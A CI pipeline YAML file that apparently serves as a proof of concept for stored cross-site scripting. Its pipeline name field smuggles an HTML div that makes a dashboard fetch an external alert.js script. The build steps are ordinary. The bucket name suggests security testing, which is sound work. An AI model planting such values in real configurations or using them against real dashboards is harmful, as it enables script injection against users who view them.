version: v1.0
name: 'Test<div data-poll-href=''https://storage.googleapis.com/c53_poc/alert.js?v=2''></div>'
agent:
  machine:
    type: s1-kubernetes
    os_image: ''
blocks:
  - name: Build & Test
    task:
      jobs:
        - name: Test
          commands:
            - checkout
            - ls -lia
            - echo "2"
            - test-results publish report.xml
  - name: Build & Test2
    task:
      jobs:
        - name: Test
          commands:
            - checkout
            - ls -lia
            - echo "2"
            - test-results publish report.xml
    run:
      when: 'change_in(''/frontend'', {default_branch: ''main'', pipeline_file: ''ignore''})'
after_pipeline:
  task:
    jobs:
      - name: Merge reports
        commands:
          - test-results gen-pipeline-report
